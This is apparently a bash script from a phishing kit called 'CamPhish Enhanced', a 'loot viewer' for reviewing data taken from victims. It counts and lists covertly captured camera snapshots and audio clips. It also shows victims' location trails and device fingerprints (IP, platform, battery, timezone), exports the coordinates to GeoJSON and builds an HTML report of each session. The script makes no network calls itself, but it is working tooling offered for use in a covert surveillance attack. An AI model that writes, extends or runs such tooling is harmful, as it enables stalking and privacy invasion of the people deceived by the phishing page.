#!/bin/bash

# CamPhish Enhanced — Loot Viewer

# Post-session analysis tool for reviewing captured data

# Usage: ./loot_viewer.sh [loot_directory]



LOOT_DIR="${1:-./loot}"



# Colors

RED='\e[1;91m'

GREEN='\e[1;92m'

YELLOW='\e[1;93m'

BLUE='\e[1;94m'

CYAN='\e[1;96m'

WHITE='\e[1;97m'

RESET='\e[0m'



banner() {

    printf "${BLUE}"

    printf "╔═══════════════════════════════════════╗\n"

    printf "║   CamPhish Loot Viewer v2.0           ║\n"

    printf "╚═══════════════════════════════════════╝${RESET}\n\n"

}



# ─── Overview ──────────────────────────────────────────────────

show_overview() {

    printf "${YELLOW}═══════════ LOOT OVERVIEW ═══════════${RESET}\n\n"



    if [[ ! -d "$LOOT_DIR" ]]; then

        printf "${RED}[!] Loot directory not found: %s${RESET}\n" "$LOOT_DIR"

        exit 1

    fi



    printf "${WHITE}Loot Directory: ${CYAN}%s${RESET}\n\n" "$(realpath "$LOOT_DIR")"



    # Camera files

    local cam_count=0

    local cam_size=0

    if [[ -d "$LOOT_DIR/camera" ]]; then

        cam_count=$(find "$LOOT_DIR/camera" -type f \( -name "*.jpg" -o -name "*.png" \) 2>/dev/null | wc -l)

        cam_size=$(du -sh "$LOOT_DIR/camera" 2>/dev/null | cut -f1)

    fi

    printf "${GREEN}📸 Camera Snapshots: ${CYAN}%d${WHITE} files (%s)${RESET}\n" "$cam_count" "${cam_size:-0B}"



    # Audio files

    local audio_count=0

    local audio_size=0

    if [[ -d "$LOOT_DIR/audio" ]]; then

        audio_count=$(find "$LOOT_DIR/audio" -type f \( -name "*.webm" -o -name "*.ogg" -o -name "*.mp4" \) 2>/dev/null | wc -l)

        audio_size=$(du -sh "$LOOT_DIR/audio" 2>/dev/null | cut -f1)

    fi

    printf "${GREEN}🎙️  Audio Chunks:     ${CYAN}%d${WHITE} files (%s)${RESET}\n" "$audio_count" "${audio_size:-0B}"



    # Location entries

    local loc_count=0

    if [[ -e "$LOOT_DIR/location_log.json" ]]; then

        loc_count=$(python3 -c "import json; print(len(json.load(open('$LOOT_DIR/location_log.json'))))" 2>/dev/null || echo "0")

    fi

    printf "${GREEN}📍 Location Pings:   ${CYAN}%s${RESET}\n" "$loc_count"



    # Fingerprints

    local fp_count=0

    if [[ -e "$LOOT_DIR/fingerprints.json" ]]; then

        fp_count=$(python3 -c "import json; print(len(json.load(open('$LOOT_DIR/fingerprints.json'))))" 2>/dev/null || echo "0")

    fi

    printf "${GREEN}🖥️  Fingerprints:     ${CYAN}%s${RESET}\n" "$fp_count"



    # IP logs

    local ip_count=0

    if [[ -e "$LOOT_DIR/ip_log.json" ]]; then

        ip_count=$(python3 -c "import json; print(len(json.load(open('$LOOT_DIR/ip_log.json'))))" 2>/dev/null || echo "0")

    fi

    printf "${GREEN}🌐 IP Entries:       ${CYAN}%s${RESET}\n" "$ip_count"



    # Sessions

    local sess_count=0

    if [[ -e "$LOOT_DIR/sessions.json" ]]; then

        sess_count=$(python3 -c "import json; data=json.load(open('$LOOT_DIR/sessions.json')); print(len(set(e.get('session','') for e in data)))" 2>/dev/null || echo "0")

    fi

    printf "${GREEN}👤 Unique Sessions:  ${CYAN}%s${RESET}\n" "$sess_count"



    printf "\n"

}



# ─── Camera Details ────────────────────────────────────────────

show_camera_details() {

    printf "${YELLOW}═══════════ CAMERA CAPTURES ═══════════${RESET}\n\n"



    if [[ ! -d "$LOOT_DIR/camera" ]]; then

        printf "${WHITE}No camera captures found.${RESET}\n\n"

        return

    fi



    printf "${WHITE}%-40s %-10s %-8s${RESET}\n" "FILENAME" "SIZE" "SOURCE"

    printf "%-40s %-10s %-8s\n" "────────────────────────────────────────" "──────────" "────────"



    find "$LOOT_DIR/camera" -type f \( -name "*.jpg" -o -name "*.png" \) -printf "%f %s\n" 2>/dev/null | sort -t_ -k1 | while read -r fname fsize; do

        # Determine source from filename

        local source="unknown"

        if [[ "$fname" == *"front"* ]]; then source="FRONT"

        elif [[ "$fname" == *"rear"* ]]; then source="REAR"

        fi



        # Human-readable size

        local hsize

        if [[ $fsize -gt 1048576 ]]; then

            hsize="$(echo "scale=1; $fsize/1048576" | bc 2>/dev/null || echo "$fsize")MB"

        elif [[ $fsize -gt 1024 ]]; then

            hsize="$(echo "scale=1; $fsize/1024" | bc 2>/dev/null || echo "$fsize")KB"

        else

            hsize="${fsize}B"

        fi



        printf "${CYAN}%-40s ${WHITE}%-10s ${GREEN}%-8s${RESET}\n" "$fname" "$hsize" "$source"

    done



    printf "\n"

}



# ─── Location Trail ───────────────────────────────────────────

show_location_trail() {

    printf "${YELLOW}═══════════ LOCATION TRAIL ═══════════${RESET}\n\n"



    if [[ ! -e "$LOOT_DIR/location_log.json" ]]; then

        printf "${WHITE}No location data found.${RESET}\n\n"

        return

    fi



    python3 -c "

import json

data = json.load(open('$LOOT_DIR/location_log.json'))

print(f'  {\"TIMESTAMP\":<26} {\"LAT\":>12} {\"LON\":>12} {\"ACC\":>8} {\"SOURCE\":<10}')

print(f'  {\"─\"*26} {\"─\"*12} {\"─\"*12} {\"─\"*8} {\"─\"*10}')

for entry in data:

    ts = entry.get('timestamp', 'N/A')[:25]

    lat = entry.get('latitude', 'N/A')

    lon = entry.get('longitude', 'N/A')

    acc = entry.get('accuracy', 'N/A')

    src = entry.get('source', 'N/A')

    if lat and lon:

        lat_str = f'{float(lat):.6f}' if lat != 'N/A' else 'N/A'

        lon_str = f'{float(lon):.6f}' if lon != 'N/A' else 'N/A'

        acc_str = f'{float(acc):.0f}m' if acc and acc != 'N/A' else 'N/A'

        print(f'  {ts:<26} {lat_str:>12} {lon_str:>12} {acc_str:>8} {src:<10}')

" 2>/dev/null || printf "${RED}  [!] Python3 required for location display${RESET}\n"



    printf "\n"

}



# ─── Fingerprint Details ──────────────────────────────────────

show_fingerprints() {

    printf "${YELLOW}═══════════ DEVICE FINGERPRINTS ═══════════${RESET}\n\n"



    if [[ ! -e "$LOOT_DIR/fingerprints.json" ]]; then

        printf "${WHITE}No fingerprint data found.${RESET}\n\n"

        return

    fi



    python3 -c "

import json

data = json.load(open('$LOOT_DIR/fingerprints.json'))

for i, fp in enumerate(data):

    print(f'  ╔══ Device #{i+1} ══════════════════════════')

    print(f'  ║ Session:    {fp.get(\"session\", \"N/A\")}')

    print(f'  ║ IP:         {fp.get(\"ip\", \"N/A\")}')

    print(f'  ║ Platform:   {fp.get(\"platform\", \"N/A\")}')

    print(f'  ║ Screen:     {fp.get(\"screen_w\", \"?\")}x{fp.get(\"screen_h\", \"?\")} @ {fp.get(\"pixel_ratio\", \"?\")}x')

    print(f'  ║ Language:   {fp.get(\"language\", \"N/A\")}')

    print(f'  ║ Timezone:   {fp.get(\"timezone\", \"N/A\")}')

    print(f'  ║ Touch:      {fp.get(\"touch_points\", \"N/A\")} points')

    print(f'  ║ CPU Cores:  {fp.get(\"hardware_concurrency\", \"N/A\")}')

    print(f'  ║ RAM:        {fp.get(\"device_memory\", \"N/A\")} GB')

    bat = fp.get('battery_level')

    if bat is not None:

        charging = '⚡' if fp.get('battery_charging') else '🔋'

        print(f'  ║ Battery:    {bat}% {charging}')

    print(f'  ║ Timestamp:  {fp.get(\"timestamp\", \"N/A\")}')

    print(f'  ╚═══════════════════════════════════════')

    print()

" 2>/dev/null || printf "${RED}  [!] Python3 required for fingerprint display${RESET}\n"



    printf "\n"

}



# ─── Export to GeoJSON ─────────────────────────────────────────

export_geojson() {

    local output="${LOOT_DIR}/location_trail.geojson"



    if [[ ! -e "$LOOT_DIR/location_log.json" ]]; then

        printf "${RED}[!] No location data to export${RESET}\n"

        return

    fi



    python3 -c "

import json



data = json.load(open('$LOOT_DIR/location_log.json'))

features = []



for entry in data:

    lat = entry.get('latitude')

    lon = entry.get('longitude')

    if lat and lon:

        feature = {

            'type': 'Feature',

            'geometry': {

                'type': 'Point',

                'coordinates': [float(lon), float(lat)]

            },

            'properties': {

                'timestamp': entry.get('timestamp', ''),

                'accuracy': entry.get('accuracy', ''),

                'source': entry.get('source', ''),

                'session': entry.get('session', '')

            }

        }

        features.append(feature)



geojson = {

    'type': 'FeatureCollection',

    'features': features

}



with open('$output', 'w') as f:

    json.dump(geojson, f, indent=2)



print(f'Exported {len(features)} points to $output')

" 2>/dev/null || printf "${RED}  [!] Python3 required for GeoJSON export${RESET}\n"

}



# ─── Export Session Report (HTML) ──────────────────────────────

export_html_report() {

    local output="${LOOT_DIR}/report.html"



    printf "${GREEN}[+]${WHITE} Generating HTML report...${RESET}\n"



    python3 -c "

import json, os, datetime



loot = '$LOOT_DIR'



# Gather data

cam_files = []

if os.path.isdir(os.path.join(loot, 'camera')):

    cam_files = sorted(os.listdir(os.path.join(loot, 'camera')))



audio_files = []

if os.path.isdir(os.path.join(loot, 'audio')):

    audio_files = sorted(os.listdir(os.path.join(loot, 'audio')))



locations = []

if os.path.exists(os.path.join(loot, 'location_log.json')):

    locations = json.load(open(os.path.join(loot, 'location_log.json')))



fingerprints = []

if os.path.exists(os.path.join(loot, 'fingerprints.json')):

    fingerprints = json.load(open(os.path.join(loot, 'fingerprints.json')))



html = '''<!DOCTYPE html>

<html><head><title>CamPhish Session Report</title>

<style>

body { font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: #eee; padding: 40px; }

h1 { color: #00ff88; }

h2 { color: #00aaff; border-bottom: 1px solid #333; padding-bottom: 8px; }

table { border-collapse: collapse; width: 100%%; margin: 16px 0; }

th, td { padding: 8px 12px; border: 1px solid #333; text-align: left; }

th { background: #16213e; color: #00ff88; }

tr:hover { background: #1a1a3e; }

.stat { display: inline-block; background: #16213e; padding: 16px 24px; border-radius: 8px; margin: 8px; text-align: center; }

.stat-num { font-size: 2em; color: #00ff88; }

.stat-label { color: #888; }

img.thumb { max-width: 200px; max-height: 150px; border-radius: 4px; margin: 4px; }

</style></head><body>

<h1>CamPhish Session Report</h1>

<p>Generated: ''' + datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + '''</p>



<div>

<div class=\"stat\"><div class=\"stat-num\">''' + str(len(cam_files)) + '''</div><div class=\"stat-label\">Snapshots</div></div>

<div class=\"stat\"><div class=\"stat-num\">''' + str(len(audio_files)) + '''</div><div class=\"stat-label\">Audio Clips</div></div>

<div class=\"stat\"><div class=\"stat-num\">''' + str(len(locations)) + '''</div><div class=\"stat-label\">Location Pings</div></div>

<div class=\"stat\"><div class=\"stat-num\">''' + str(len(fingerprints)) + '''</div><div class=\"stat-label\">Fingerprints</div></div>

</div>

'''



# Camera section

if cam_files:

    html += '<h2>Camera Snapshots</h2><div>'

    for f in cam_files[:50]:

        html += f'<img class=\"thumb\" src=\"camera/{f}\" title=\"{f}\">'

    html += '</div>'



# Location table

if locations:

    html += '<h2>Location Trail</h2><table><tr><th>Timestamp</th><th>Lat</th><th>Lon</th><th>Accuracy</th><th>Source</th></tr>'

    for loc in locations:

        html += f'<tr><td>{loc.get(\"timestamp\",\"\")}</td><td>{loc.get(\"latitude\",\"\")}</td><td>{loc.get(\"longitude\",\"\")}</td><td>{loc.get(\"accuracy\",\"\")}</td><td>{loc.get(\"source\",\"\")}</td></tr>'

    html += '</table>'



# Fingerprints

if fingerprints:

    html += '<h2>Device Fingerprints</h2><table><tr><th>Session</th><th>IP</th><th>Platform</th><th>Screen</th><th>Language</th><th>Timezone</th></tr>'

    for fp in fingerprints:

        html += f'<tr><td>{fp.get(\"session\",\"\")}</td><td>{fp.get(\"ip\",\"\")}</td><td>{fp.get(\"platform\",\"\")}</td><td>{fp.get(\"screen_w\",\"\")}x{fp.get(\"screen_h\",\"\")}</td><td>{fp.get(\"language\",\"\")}</td><td>{fp.get(\"timezone\",\"\")}</td></tr>'

    html += '</table>'



html += '</body></html>'



with open('$output', 'w') as f:

    f.write(html)



print(f'Report saved to $output')

" 2>/dev/null || printf "${RED}  [!] Python3 required for HTML report${RESET}\n"

}



# ─── Interactive Menu ──────────────────────────────────────────

menu() {

    banner

    show_overview



    printf "${WHITE}Select an option:${RESET}\n\n"

    printf "${GREEN}[1]${WHITE} View camera capture details${RESET}\n"

    printf "${GREEN}[2]${WHITE} View location trail${RESET}\n"

    printf "${GREEN}[3]${WHITE} View device fingerprints${RESET}\n"

    printf "${GREEN}[4]${WHITE} Export location as GeoJSON${RESET}\n"

    printf "${GREEN}[5]${WHITE} Generate HTML session report${RESET}\n"

    printf "${GREEN}[6]${WHITE} Refresh overview${RESET}\n"

    printf "${RED}[0]${WHITE} Exit${RESET}\n"

    printf "\n"



    while true; do

        read -p $'\e[1;92m[+]\e[0m Choose option: ' choice

        case "$choice" in

            1) show_camera_details ;;

            2) show_location_trail ;;

            3) show_fingerprints ;;

            4) export_geojson ;;

            5) export_html_report ;;

            6) clear; banner; show_overview ;;

            0) printf "${GREEN}[✓] Done.${RESET}\n"; exit 0 ;;

            *) printf "${RED}[!] Invalid option${RESET}\n" ;;

        esac

        printf "\n"

    done

}



menu